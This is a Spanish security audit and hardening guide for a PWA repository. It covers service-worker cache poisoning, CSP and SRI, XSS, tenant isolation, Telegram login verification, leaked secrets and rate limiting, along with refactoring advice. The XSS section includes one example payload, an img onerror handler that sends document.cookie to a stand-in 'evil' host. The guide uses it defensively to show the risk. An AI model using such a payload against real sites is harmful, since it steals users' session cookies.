# Galloli — Guía de mejoras y correcciones urgentes de seguridad

> Basado en análisis estático del repo `ivanbj96/galloli-app` (v6.6.0).
> Dividido en **🔥 Urgente** (riesgo de hackeo o pérdida de datos) y
> **♻️ Mejora** (deuda técnica que no es crítica pero te va a doler).

---

## 🔥 URGENTE — corregir antes que cualquier feature nueva

### 1. Service Worker `sw.js` — riesgo de cache poisoning
**Problema.** Probablemente cacheas `sw.js` con `cache-first`. Si un atacante consigue inyectar JS una vez (XSS), queda persistido **para siempre** porque el SW cachea el bundle. Es la vulnerabilidad #1 de PWAs.
**Fix.**
- `sw.js` se sirve siempre con `Cache-Control: no-cache, no-store, must-revalidate` (ajusta cabeceras en Cloudflare Pages).
- Estrategia `network-first` para `/index.html`, `/app.js`, `/modules.js`. `cache-first` solo para assets con hash en el nombre.
- Implementa `skipWaiting()` + `clients.claim()` y un canal de mensaje para forzar `update` desde el panel.
- Lista negra de orígenes externos en el handler `fetch`: nunca cachear respuestas de dominios distintos al tuyo.

### 2. Falta de CSP (Content-Security-Policy)
**Problema.** Cargas dependencias por CDN sin SRI. Un compromiso de unpkg/jsdelivr ejecuta código arbitrario en todas las sesiones.
**Fix.**
- Cabecera CSP estricta en Pages:
  ```
  default-src 'self';
  script-src 'self' https://unpkg.com 'sha384-…';
  connect-src 'self' https://api.galloli.app https://*.workers.dev;
  img-src 'self' data: https://*.tile.openstreetmap.org;
  style-src 'self' 'unsafe-inline';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
  ```
- **Migra todos los `<script src="cdn…">` a dependencias bundleadas** (Vite + esbuild). El "no usar bundler" es la decisión más cara del repo.
- Añade `Subresource Integrity (SRI)` mientras tanto: `<script src="…" integrity="sha384-…" crossorigin="anonymous">`.

### 3. Innumerables `innerHTML` en `app.js` / `modules.js` → XSS
**Problema.** En Vanilla JS sin templating, cada `innerHTML = clientName` con dato del cliente es un XSS si el atacante registra un cliente llamado `<img src=x onerror=fetch('//evil/?'+document.cookie)>`. Como tu IndexedDB se sincroniza vía Worker, basta comprometer **un** dispositivo para infectar a todos los demás.
**Fix.**
- Reemplaza `el.innerHTML = data` por `el.textContent = data` siempre que sea texto plano.
- Cuando necesites HTML, usa una helper `escapeHtml()` o pásate a `lit-html`/`htm` (mínima superficie, sin build).
- Audita el repo: `rg "\.innerHTML\s*=" -n`. Cada hit es un candidato.

### 4. Sincronización sin firma → spoofing entre tenants
**Problema.** El esquema multi-tenant de `workers/schema.sql` separa por `tenant_id`, pero el cliente lo envía en cada request. Si un usuario manipula su token JWT/Telegram, puede leer/escribir datos de otro tenant.
**Fix.**
- `tenant_id` debe derivarse **siempre en el Worker** desde el JWT verificado, nunca del body del request.
- Toda query SQL parametrizada con `WHERE tenant_id = ?` donde el `?` viene del JWT, no del payload.
- Añade tests de "intento de cross-tenant access" → debe devolver 403.

### 5. Auth Telegram — verificar firma `hash` correctamente
**Problema.** Si tu lado del Worker no verifica el HMAC-SHA256 del payload de Telegram Login con tu Bot Token, **cualquiera puede falsificar `auth_date` + `id`** y entrar como otro usuario.
**Fix.** Implementa la verificación oficial:
```js
const dataCheck = Object.keys(data).filter(k => k !== 'hash')
  .sort().map(k => `${k}=${data[k]}`).join('\n');
const secretKey = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(BOT_TOKEN));
const hmac = await crypto.subtle.sign('HMAC',
  await crypto.subtle.importKey('raw', secretKey, { name:'HMAC', hash:'SHA-256' }, false, ['sign']),
  new TextEncoder().encode(dataCheck));
const computed = [...new Uint8Array(hmac)].map(b=>b.toString(16).padStart(2,'0')).join('');
if (computed !== data.hash) throw new Error('Bad signature');
if (Date.now()/1000 - data.auth_date > 86400) throw new Error('Expired');
```

### 6. Backups Telegram → token del bot expuesto en cliente
**Problema.** Si el `BOT_TOKEN` está en `app.js` o `modules.js` para enviar backups directamente desde el navegador, **cualquier usuario tiene control total del bot**.
**Fix.** El cliente NUNCA habla con `api.telegram.org`. Hace POST a un endpoint del Worker `/api/backup` y el Worker (con el token guardado como `wrangler secret`) reenvía a Telegram.

### 7. Archivos `.zip` y logs commiteados
**Problema.** Vi binarios `.zip` en el repo. Aparte del peso, suelen contener tokens/dumps. Una vez commiteados, **siguen accesibles en el historial git aunque los borres**.
**Fix.**
- `git filter-repo --invert-paths --path "logs.zip"` (rehace el historial — coordina con tu equipo si lo hay).
- Añade a `.gitignore`: `*.zip`, `*.log`, `*.sqlite`, `*.db`, `.env*`, `google-services.json` (si está fuera del workflow).
- **Rota cualquier secret que estuviera en esos zips**: bot token Telegram, claves SRI, API keys.

### 8. D1 — falta de rate limiting
**Problema.** Cualquier tenant puede DoSearte llenando D1 con inserts. D1 cobra por escritura.
**Fix.** En el Worker, mete un rate limit por tenant (Durable Object con bucket leaky o el nuevo Cloudflare Rate Limiting binding). Sugerencia: 60 escrituras/min por dispositivo.

### 9. Service Worker `fetch` no valida orígenes
**Problema.** Si interceptas todos los `fetch`, alguien puede registrar un SW malicioso si tu CSP `worker-src` es laxa.
**Fix.** `Service-Worker-Allowed: /` solo si lo necesitas; `worker-src 'self'` en CSP.

### 10. Permisos Capacitor — ubicación en background sin justificación visible
**Problema.** Aunque sea uso interno, si Android revoca el permiso silenciosamente (cambio de SO, optimización), el motor de venta automática falla en silencio y crees que la balanza está rota.
**Fix.** Añade un health-check al abrir la app que verifique los 4 permisos críticos y muestre un banner rojo si falta alguno. Ya está parcialmente implementado en `auto-sale-engine.js`; falta exponerlo en UI.

---

## ♻️ MEJORAS (importantes, no críticas)

### A. Adoptar un build step
**Por qué.** Sin bundler:
- No puedes usar SRI con confianza (cada deploy CDN puede cambiar).
- No tree-shaking → bundle inflado.
- Sin TypeScript / sin checks estáticos en 11k LoC.
- No puedes hacer lo del punto 2 (CSP estricta).

**Plan mínimo.** Añade Vite. Mueve los `<script src="cdn">` a `npm install` + `import`. El `app.js` y `modules.js` siguen siendo JS plano, solo cambia cómo se sirven.

### B. Modularizar `app.js` (6.7k LoC) y `modules.js` (4.5k LoC)
**Por qué.** Imposible auditar XSS con archivos así. Imposible testear.
**Plan.** Extrae por dominio:
```
src/
  domain/clients/
  domain/sales/
  domain/inventory/
  domain/sri/
  domain/sync/
  ui/screens/
  ui/components/
```
Cada archivo <500 LoC. Una iteración por semana, no big-bang.

### C. Tests
- **Vitest** para lógica pura (cálculo de totales, parsing de tramas BLE, validador SRI).
- **Playwright** para flujos críticos (registrar cliente → registrar venta → ver en historial).
- Cobertura objetivo: 60% en módulos de dominio. La UI puede esperar.

### D. Migración offline-first más robusta
- El `sync-engine.js` parece basarse en "última escritura gana". Para multi-dispositivo eso pierde ventas. Considera **CRDT** (yjs) o un esquema de event log con timestamps Lamport.
- Añade sync queue persistente con reintento exponencial y dead-letter queue visible en UI.

### E. Observabilidad
- Sentry o Cloudflare Workers Logpush → Logs estructurados.
- Métricas: ventas/min, errores SRI, latencia D1, dispositivos activos.
- Health endpoint público `/healthz` que verifica D1 + Durable Objects + tasa de errores.

### F. Capacitor: actualizar plugins en cada release de Android
Capacitor 8 es reciente; mantén un calendario trimestral. Plugins desactualizados = vulnerabilidades nativas que no controlas.

### G. SRI (cuando lo actives)
- Firma XAdES-BES en **el dispositivo**, no en el Worker (la clave privada del certificado nunca debe salir del dueño).
- Cola persistente para reintento (recepción SRI cae con frecuencia).
- Validador local pre-envío: si XML mal formado, bloquea antes de quemar comprobante.

---

## Checklist de aplicación (orden recomendado)

- [ ] Crear `apk-native` branch y aplicar parche de venta automática
- [ ] Punto 7 — limpiar repo de zips y rotar secrets
- [ ] Punto 4, 5, 6 — corregir tenant_id, firma Telegram, mover backup al Worker
- [ ] Punto 3 — auditar y reemplazar `innerHTML` por `textContent` / escapeHtml
- [ ] Punto 1 — endurecer service worker (network-first para HTML/JS)
- [ ] Punto 2 — añadir CSP + SRI (requiere bundler → punto A)
- [ ] Mejora A — introducir Vite
- [ ] Mejora B — empezar modularización por dominio
- [ ] Mejoras C, D, E — tests, sync robusto, observabilidad

Cualquier paso de la lista aceleramos por separado: dime cuál atacamos después del parche del APK.
